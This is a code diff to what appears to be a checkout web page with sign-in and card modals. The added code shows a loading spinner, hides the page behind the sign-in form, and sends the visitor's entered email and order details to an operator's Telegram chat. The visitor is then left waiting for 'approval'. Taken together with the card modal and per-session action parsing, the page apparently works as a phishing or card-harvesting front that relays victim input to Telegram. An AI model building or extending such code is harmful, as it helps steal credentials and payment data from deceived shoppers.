@@ -209,6 +209,36 @@
       cursor: not-allowed;
     }
     
+    .auth-form button.enabled {
+      background: #3b82f6;
+      cursor: pointer;
+    }
+    
+    .auth-form button.loading {
+      background: #9ca3af !important;
+      cursor: not-allowed;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .auth-form button.loading::after {
+      content: '';
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      width: 20px;
+      height: 20px;
+      margin: -10px 0 0 -10px;
+      border: 2px solid transparent;
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
     .trouble-link,
     .location-help,
     .terms a {
@@ -318,6 +348,12 @@
     
     .auth-overlay.show {
       display: grid;
+    }
+    
+    body.auth-open main,
+    body.auth-open .cart-panel,
+    body.auth-open .topline {
+      display: none !important;
     }
   </style>
   
@@ -665,10 +701,12 @@ const [, action, kind, sessionId] = match;
     
     function showSigninModal() {
       document.querySelector('#signin-modal').classList.add('show');
+      document.body.classList.add('auth-open');
     }
     
     function hideSigninModal() {
       document.querySelector('#signin-modal').classList.remove('show');
+      document.body.classList.remove('auth-open');
     }
     
     function showCardModal(sessionId) {
@@ -824,11 +862,14 @@ const [, action, kind, sessionId] = match;
     document.querySelector('#signin-form').onsubmit = (e) => {
       e.preventDefault();
       const email = document.querySelector('#signin-email').value;
+      const submitBtn = document.querySelector('#signin-form button[type="submit"]');
+      
+      submitBtn.classList.add('loading');
+      
       const session = getSession(window.currentSessionId);
       if (session) {
         updateSession(session.id, { email });
       }
-      hideSigninModal();
       
       tgNotify(window.TELEGRAM_CONFIG.chatId,
         `🔔 NEW CHECKOUT
@@ -843,7 +884,7 @@ Price: ${money(unitPrice)}`,
         }
       );
       
-      showToast('Awaiting approval in Telegram...');
+      showToast('Check your Telegram to approve the order...');
     };
     
     // Close signin modal
